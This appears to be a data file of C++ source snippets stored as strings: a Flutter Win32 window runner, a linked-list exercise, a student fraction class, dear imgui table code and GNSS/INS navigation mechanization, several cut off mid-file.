    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "#include<iostream>\n\nusing namespace std;\n\ntemplate <class T> //\u0448\u0430\u0431\u043b\u043e\u043d \u043a\u043b\u0430\u0441\u0441\u0430 \u0441 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0422\nclass List\n{\npublic:\n    List() : head(0), tail(0), theCount(0) {}\n\tvirtual ~List();\n    T front() const; //\u0432\u043e\u0437\u0432\u0440\u0430\u0448\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u044d\u043b.\n    T back() const; //\u0432\u043e\u0437\u0432\u0440\u0430\u0448\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u044d\u043b.\n    void push_front(T value); //\u0434\u043e\u0431\u0430\u0432\u0434\u043b\u0435\u043d\u0438\u0435 \u0434\u043e\u0432\u043e\u0433\u043e \u044d\u0434. \u0432 \u043d\u0430\u0447\u0430\u043b\u043e \u0441\u043f\u0438\u0441\u043a\u0430\n    void push_back(T value); //\u0434\u043e\u0431\u0430\u0432\u0434\u043b\u0435\u043d\u0438\u0435 \u0434\u043e\u0432\u043e\u0433\u043e \u044d\u0434. \u0432 \u043a\u043e\u043d\u0435\u0446 \u0441\u043f\u0438\u0441\u043a\u0430\n    void pop_front(); //\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u0437\u0434\u0430\u0447\u0435\u043d\u0438\u044f \u0432 \u0441\u043f\u0438\u0441\u0435\n    void pop_back(); //\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u0437\u0434\u0430\u0447\u0435\u043d\u0438\u044f \u0432 \u0441\u043f\u0438\u0441\u0435\n\tvoid insert(T value); //\u0432\u0441\u0442\u0430\u0432\u043a\u0430 \u044d\u043b. \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\n\n    //\u0442\u0443\u0442 \u044f \u0447\u0442\u043e-\u0442\u043e \u043d\u0430 \u0433\u043e\u0440\u043e\u0434\u0438\u043b\n    class Iterator; // \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 \u0438\u0442\u0435\u0440\u0430\u0442\u043e\u0440\u0430\n    Iterator begin() const; // \u0444\u0443\u043d\u043a\u0446\u0438\u044f begin\n    Iterator end() const; // \u0444\u0443\u043d\u043a\u0446\u0438\u044f end\n    //\u0442\u0443\u0442 \u0437\u0430\u043a\u043e\u043d\u0447\u0438\u043b\n\n    int size() { return theCount; } //\u0432\u043e\u0437\u0432\u0440\u0430\u0448\u0430\u0435\u043c \u043a\u043e\u043b-\u0432\u043e \u044d\u043b.\n\tbool is_present(T value) const;\n\tT is_empty() const\n\t{\n    \treturn head == 0;\n\t}\n\tT count() const { return theCount; }\nprivate:\n\tclass ListCell\n\t{\n\tpublic:\n    \tListCell(T value, ListCell *cell = 0) : val(value), next(cell) {}\n    \tT val;\n    \tListCell *next;\n\t};\n\tT val;\n\tListCell *next; // \u0441\u043f\u0438\u0441\u043e\u043a\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439\n\tListCell *head; // \u043f\u0435\u0440\u0432\u044b\u0439 \u044d\u043b.\n\tListCell *tail; // \u043f\u043e\u043b\u0441\u0435\u0434\u043d\u0438\u0439 \u044d\u043b.\n\tT theCount;\n};\n\n//\u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\ntemplate <typename T>\nList<T>::~List()\n{\n\twhile (head != nullptr)\n\t{\n\t\tListCell *temp = head;\n\t\thead = head->next;\n\t\tdelete temp;\n\t}\t\n}\n\n//\u0432\u043e\u0437\u0432\u0440\u0430\u0448\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u044d\u043b.\ntemplate <typename T>\nT List<T>::front() const\n{\n    if(head != nullptr)\n    {\n        return head->val;\n    }\n    throw std::runtime_error(\"List is empty\");\n}\n//\u0432\u043e\u0437\u0432\u0440\u0430\u0448\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u044d\u043b.\ntemplate <typename T>\nT List<T>::back() const\n{\n    if(head != nullptr)\n    {\n        return tail->val;\n    }\n    throw std::runtime_error(\"List is empty\");\n}\n\n//\u0432\u0441\u0442\u0430\u0432\u043a\u0430\ntemplate <typename T>\nvoid List<T>::insert(T value)\n{\n    head = new ListCell(value, head);\n    if (tail == nullptr)\n    {\n        tail = head;\n    }\n    ++theCount;\n}\n\n//\u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u043d\u0430\u0447\u0430\u043b\u043e \u0441\u043f\u0438\u0441\u043a\u0430\ntemplate <typename T>\nvoid List<T>::push_front(T value)\n{\n    ListCell *newCell = new ListCell(value, head);\n    head = newCell;\n    if(tail == nullptr)\n    {\n        tail = newCell;\n    }\n    ++theCount;\n}\n\n//\u0434\u043e\u0434\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u043a\u043e\u043d\u0435\u0446 \u0441\u043f\u0438\u0441\u043a\u0430\ntemplate <typename T>\nvoid List<T>::push_back(T value)\n{\n    ListCell *newCell = new ListCell(value, nullptr);\n    if(tail != nullptr)\n    {\n        tail->next = newCell;\n    }\n    tail = newCell;\n    if(head == nullptr)\n    {\n        head = newCell;\n    }\n    ++theCount;\n}\n\n//\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0432\u043e\u0433\u043e \u044d\u043b.\ntemplate <typename T>\nvoid List<T>::pop_front()\n{\n    if(head != nullptr)\n    {\n        ListCell *oldHead = head;\n        head = head->next;\n        delete oldHead; // \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0441\u0442\u0430\u0440\u043e\u0433\u043e \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430\n        --theCount; // \u0443\u043c\u0435\u043d\u044c\u0448\u0430\u0435\u043c \u0434\u043b\u0438\u043d\u0443\n    }\n}\n\n//\u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u044d\u043b.\ntemplate <typename T>\nvoid List<T>::pop_back()\n{\n    if (tail != nullptr)\n    {\n        //\u0435\u0441\u043b\u0438 \u043d\u0430\u0447\u0430\u043b\u043e \u0438 \u043a\u043e\u043d\u0435\u0446 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u0435\n        if (head == tail)\n        {\n            delete head; // \u0443\u0434\u0430\u043b. \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u044c.  \n            head = tail = nullptr;// \u0437\u0430\u043d\u0443\u043b\u044f\u0435\u043c\n        }\n        else\n        {\n            ListCell *prev = head;\n            while (prev->next != tail)\n            {\n                prev = prev->next;\n            }\n            delete tail;\n            tail = prev;\n            tail->next = nullptr;\n        }\n        --theCount;\n    }\n}\n\ntemplate <typename T>\nbool List<T>::is_present(T value) const\n{\n    for (ListCell *cell = head; cell != nullptr; cell = cell->next)\n    {\n        if (cell->val == value)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\n//\u0442\u0443\u0442 \u0440\u0435\u0430\u043b\u0438\u0437\u0438\u0446\u0438\u044f \u0432\u0435\u043b\u043e\u0441\u0435\u043f\u0435\u0434\u0430\n// \u043a\u043b\u0430\u0441\u0441 \u0438\u0442\u0435\u0440\u0430\u0442\u043e\u0440\u0430\ntemplate <typename T>\nclass List<T>::Iterator\n{\npublic:\n    Iterator(ListCell *ptr) : current(ptr) {}\n    T& operator*() { return current->val; }\n    Iterator& operator++() { current = current->next; return *this; }\n    bool operator!=(const Iterator& other) const { return current != other.current; }\nprivate:\n    ListCell *current;\n};\n\n// \u0444\u0443\u043d\u043a\u0446\u0438\u044f begin\ntemplate <typename T>\ntypename List<T>::Iterator List<T>::begin() const\n{\n    return Iterator(head);\n}\n\n// \u0444\u0443\u043d\u043a\u0446\u0438\u044f end\ntemplate <typename T>\ntypename List<T>::Iterator List<T>::end() const\n{\n    return Iterator(nullptr);\n}\n//\u0432\u0435\u043b\u043e\u0441\u0435\u043f\u0435\u0434 \u043e\u043a\u043e\u043d\u0447\u0435\u043d\n\nint main()\n{\n    List<int> myList;\n    myList.push_front(5);\n    myList.push_back(1);\n    myList.push_back(2);\n    myList.push_front(3);\n\n    //\u0432\u044b\u0432\u043e\u0434\n    for(auto it = myList.begin(); it != myList.end(); ++it)\n    {\n        std::cout << *it << \" \";\n    }\n    return 0;\n}\n\n/*\n(*)front() \u2013 \u041f\u043e\u0432\u0435\u0440\u0442\u0430\u0454 \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f \u043f\u0435\u0440\u0448\u043e\u0433\u043e \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u0432 \u0441\u043f\u0438\u0441\u043a\u0443.\n(*)back() \u2013 \u041f\u043e\u0432\u0435\u0440\u0442\u0430\u0454 \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f \u043e\u0441\u0442\u0430\u043d\u043d\u044c\u043e\u0433\u043e \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u0432 \u0441\u043f\u0438\u0441\u043a\u0443.\n(*)push_front() \u2013 \u0434\u043e\u0434\u0430\u0454 \u043d\u043e\u0432\u0438\u0439 \u0435\u043b\u0435\u043c\u0435\u043d\u0442 \u043d\u0430 \u043f\u043e\u0447\u0430\u0442\u043a\u0443 \u0441\u043f\u0438\u0441\u043a\u0443.\n(*)push_back() \u2013 \u0434\u043e\u0434\u0430\u0454 \u043d\u043e\u0432\u0438\u0439 \u0435\u043b\u0435\u043c\u0435\u043d\u0442 \u0443 \u043a\u0456\u043d\u0435\u0446\u044c \u0441\u043f\u0438\u0441\u043a\u0443.\n(*)pop_front() \u2013 \u0432\u0438\u0434\u0430\u043b\u044f\u0454 \u043f\u0435\u0440\u0448\u0438\u0439 \u0435\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043f\u0438\u0441\u043a\u0443 \u0442\u0430 \u0437\u043c\u0435\u043d\u0448\u0443\u0454 \u0440\u043e\u0437\u043c\u0456\u0440 \u0441\u043f\u0438\u0441\u043a\u0443 \u043d\u0430 1.\n(*)pop_back() \u2013 \u0432\u0438\u0434\u0430\u043b\u044f\u0454 \u043e\u0441\u0442\u0430\u043d\u043d\u0456\u0439 \u0435\u043b\u0435\u043c\u0435\u043d\u0442 \u0441\u043f\u0438\u0441\u043a\u0443 \u0442\u0430 \u0437\u043c\u0435\u043d\u0448\u0443\u0454 \u0440\u043e\u0437\u043c\u0456\u0440 \u0441\u043f\u0438\u0441\u043a\u0443 \u043d\u0430 1.\n(*)insert() \u2013 \u0432\u0441\u0442\u0430\u0432\u043b\u044f\u0454 \u043d\u043e\u0432\u0456 \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u0438 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a \u043f\u0435\u0440\u0435\u0434 \u0435\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u043c \u0443 \u0432\u043a\u0430\u0437\u0430\u043d\u0456\u0439 \u043f\u043e\u0437\u0438\u0446\u0456\u0457.\n(*)size() \u2013 \u043f\u043e\u0432\u0435\u0440\u0442\u0430\u0454 \u043a\u0456\u043b\u044c\u043a\u0456\u0441\u0442\u044c \u0435\u043b\u0435\u043c\u0435\u043d",
    "//7106721\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nclass Fraction {\r\nprotected:\r\n    int numerator, denominator, whole_number;\r\n\r\npublic:\r\n    // Constructor for fractions without whole number\r\n    Fraction(int num, int deno) {\r\n        numerator = num;\r\n        denominator = deno;\r\n        whole_number = 0;\r\n    }\r\n\r\n    // Constructor for mixed fractions\r\n    Fraction(int whole, int num, int deno) {\r\n        whole_number = whole;\r\n        numerator = num;\r\n        denominator = deno;\r\n    }\r\n\r\n    // Overloaded addition operator\r\n    Fraction operator+(const Fraction& fraction_2) const {\r\n        int fraction_upper = (numerator * fraction_2.denominator) + (fraction_2.numerator * denominator);\r\n        int fraction_bottom = denominator * fraction_2.denominator;\r\n        return Fraction(fraction_upper, fraction_bottom);\r\n    }\r\n\r\n    // Overloaded multiplication operator\r\n    Fraction operator*(const Fraction& fraction_3) const {\r\n        int fraction_top = numerator * fraction_3.numerator;\r\n        int fraction_down = denominator * fraction_3.denominator;\r\n        return Fraction(fraction_top, fraction_down);\r\n    }\r\n\r\n    // Convert fraction to decimal\r\n    float toDecimal() const {\r\n        return static_cast<float>(numerator) / denominator;\r\n    }\r\n\r\n    // Display fraction\r\n    void showFraction() const {\r\n        if (whole_number != 0) {\r\n            cout << whole_number << \" \" << numerator << \"/\" << denominator << endl;\r\n        } else {\r\n            cout << numerator << \"/\" << denominator << endl;\r\n        }\r\n    }\r\n};\r\n\r\nclass ProperFraction : public Fraction {\r\n\r\n};\r\n\r\nclass ImproperFraction : public Fraction {\r\nprivate:\r\n    bool mixed;\r\n\r\npublic:\r\n    // Constructor with mixed fraction indicator\r\n    ImproperFraction(int num, int deno, bool mix) : Fraction(num, deno), mixed(mix) {}\r\n\r\n    // Accessor for mixed attribute\r\n    bool isMixed() const {\r\n        return mixed;\r\n    }\r\n\r\n    // Mutator for mixed attribute\r\n    void setMixed(bool mix) {\r\n        mixed = mix;\r\n    }\r\n\r\n    // Simplify the fraction\r\n    void simplify() {\r\n        int gcd = calculateGCD(numerator, denominator);\r\n        numerator /= gcd;\r\n        denominator /= gcd;\r\n    }\r\n\r\n    // Helper function to find greatest common divisor\r\n    int calculateGCD(int a, int b) const {\r\n        if (b == 0)\r\n            return a;\r\n        return calculateGCD(b, a % b);\r\n    }\r\n};\r\n\r\nint main() {\r\n    // Create instances of Fraction\r\n    Fraction alpha(1, 2);\r\n    Fraction beta(2, 3, 4);\r\n    Fraction gamma(5, 3);\r\n    Fraction delta(2, 3, 4);\r\n\r\n    // Calculation x: (1/2) + (1/2)\r\n    Fraction x_result = alpha + alpha;\r\n    cout << \"a: \";\r\n    x_result.showFraction();\r\n\r\n    // Calculation y: (2 whole number, 3/4) + (5/3)\r\n    Fraction y_result = beta + gamma;\r\n    cout << \"b: \";\r\n    y_result.showFraction();\r\n\r\n    // Calculation z: (5/3) + (1/2)\r\n    Fraction z_result = gamma + alpha;\r\n    cout << \"c: \";\r\n    z_result.showFraction();\r\n\r\n    // Calculation w: (2 whole number 3/4) * 5/3\r\n    Fraction w_result = delta * gamma;\r\n    cout << \"d: \";\r\n    w_result.showFraction();\r\n\r\n    // Calculation p: Convert (1/2) to decimal\r\n    float p_result = alpha.toDecimal();\r\n    cout << \"e: \" << p_result << endl;\r\n\r\n    // Calculation q: Convert 5/3 to decimal\r\n    float q_result = gamma.toDecimal();\r\n    cout << \"f: \" << q_result << endl;\r\n\r\n    // Convert 2 whole number, 3/4 to decimal\r\n    float r_result = delta.toDecimal();\r\n    cout << \"g: \" << r_result << endl;\r\n\r\n    // Extend functionalities for ImproperFraction\r\n    ImproperFraction impFraction(7, 10, true);\r\n\r\n    // Check if the fraction is mixed\r\n    cout << \"Is mixed: \" << (impFraction.isMixed() ? \"Yes\" : \"No\") << endl;\r\n\r\n    // Set the fraction as not mixed\r\n    impFraction.setMixed(false);\r\n\r\n    // Simplify the fraction\r\n    impFraction.simplify();\r\n    cout << \"Simplified improper fraction: \";\r\n    impFraction.showFraction();\r\n\r\n    return 0;\r\n}\r\n",
    "// dear imgui, v1.82\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending of if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.\n//   Y with ScrollX/ScrollY disabled: we ",
    "/*\n * KF-GINS: An EKF-Based GNSS/INS Integrated Navigation System\n *\n * Copyright (C) 2022 i2Nav Group, Wuhan University\n *\n *     Author : Liqiang Wang\n *    Contact : wlq@whu.edu.cn\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include \"common/earth.h\"\n#include \"common/rotation.h\"\n\n#include \"insmech.h\"\n\nvoid INSMech::insMech(const PVA &pvapre, PVA &pvacur, const IMU &imupre, const IMU &imucur) {\n\n    // perform velocity update, position updata and attitude update in sequence, irreversible order\n    // \u4f9d\u6b21\u8fdb\u884c\u901f\u5ea6\u66f4\u65b0\u3001\u4f4d\u7f6e\u66f4\u65b0\u3001\u59ff\u6001\u66f4\u65b0, \u4e0d\u53ef\u8c03\u6362\u987a\u5e8f\n    velUpdate(pvapre, pvacur, imupre, imucur);\n    posUpdate(pvapre, pvacur, imupre, imucur);\n    attUpdate(pvapre, pvacur, imupre, imucur);\n}\n\nvoid INSMech::velUpdate(const PVA &pvapre, PVA &pvacur, const IMU &imupre, const IMU &imucur) {\n\n    Eigen::Vector3d d_vfb, d_vfn, d_vgn, gl, midvel, midpos;\n    Eigen::Vector3d temp1, temp2, temp3;\n    Eigen::Matrix3d cnn, I33 = Eigen::Matrix3d::Identity();\n    Eigen::Quaterniond qne, qee, qnn, qbb, q1, q2;\n\n    // \u8ba1\u7b97\u5730\u7406\u53c2\u6570\uff0c\u5b50\u5348\u5708\u534a\u5f84\u548c\u536f\u9149\u5708\u534a\u5f84\uff0c\u5730\u7403\u81ea\u8f6c\u89d2\u901f\u5ea6\u6295\u5f71\u5230n\u7cfb, n\u7cfb\u76f8\u5bf9\u4e8ee\u7cfb\u8f6c\u52a8\u89d2\u901f\u5ea6\u6295\u5f71\u5230n\u7cfb\uff0c\u91cd\u529b\u503c\n    // calculate geographic parameters, Meridian and Mao unitary radii,\n    // earth rotational angular velocity projected to n-frame,\n    // rotational angular velocity of n-frame to e-frame projected to n-frame, and gravity\n    Eigen::Vector2d rmrn = Earth::meridianPrimeVerticalRadius(pvapre.pos(0));\n    Eigen::Vector3d wie_n, wen_n;\n    wie_n << WGS84_WIE * cos(pvapre.pos[0]), 0, -WGS84_WIE * sin(pvapre.pos[0]);\n    wen_n << pvapre.vel[1] / (rmrn[1] + pvapre.pos[2]), -pvapre.vel[0] / (rmrn[0] + pvapre.pos[2]),\n        -pvapre.vel[1] * tan(pvapre.pos[0]) / (rmrn[1] + pvapre.pos[2]);\n    double gravity = Earth::gravity(pvapre.pos);\n\n    // \u65cb\u8f6c\u6548\u5e94\u548c\u53cc\u5b50\u6837\u5212\u6868\u6548\u5e94\n    // rotational and sculling motion\n    temp1 = imucur.dtheta.cross(imucur.dvel) / 2;\n    temp2 = imupre.dtheta.cross(imucur.dvel) / 12;\n    temp3 = imupre.dvel.cross(imucur.dtheta) / 12;\n\n    // b\u7cfb\u6bd4\u529b\u79ef\u5206\u9879\n    // velocity increment due to the specific force\n    d_vfb = imucur.dvel + temp1 + temp2 + temp3;\n\n    // \u6bd4\u529b\u79ef\u5206\u9879\u6295\u5f71\u5230n\u7cfb\n    // velocity increment dut to the specfic force projected to the n-frame\n    temp1 = (wie_n + wen_n) * imucur.dt / 2;\n    cnn   = I33 - Rotation::skewSymmetric(temp1);\n    d_vfn = cnn * pvapre.att.cbn * d_vfb;\n\n    // \u8ba1\u7b97\u91cd\u529b/\u54e5\u5f0f\u79ef\u5206\u9879\n    // velocity increment due to the gravity and Coriolis force\n    gl << 0, 0, gravity;\n    d_vgn = (gl - (2 * wie_n + wen_n).cross(pvapre.vel)) * imucur.dt;\n\n    // \u5f97\u5230\u4e2d\u95f4\u65f6\u523b\u901f\u5ea6\n    // velocity at k-1/2\n    midvel = pvapre.vel + (d_vfn + d_vgn) / 2;\n\n    // \u5916\u63a8\u5f97\u5230\u4e2d\u95f4\u65f6\u523b\u4f4d\u7f6e\n    // position extrapolation to k-1/2\n    qnn = Rotation::rotvec2quaternion(temp1);\n    temp2 << 0, 0, -WGS84_WIE * imucur.dt / 2;\n    qee = Rotation::rotvec2quaternion(temp2);\n    qne = Earth::qne(pvapre.pos);\n    qne = qee * qne * qnn;\n    midpos[2] = pvapre.pos[2] - midvel[2] * imucur.dt / 2;\n    midpos    = Earth::blh(qne, midpos[2]);\n\n    // \u91cd\u65b0\u8ba1\u7b97\u4e2d\u95f4\u65f6\u523b\u7684rmrn, wie_e, wen_n\n    // recompute rmrn, wie_n, and wen_n at k-1/2\n    rmrn = 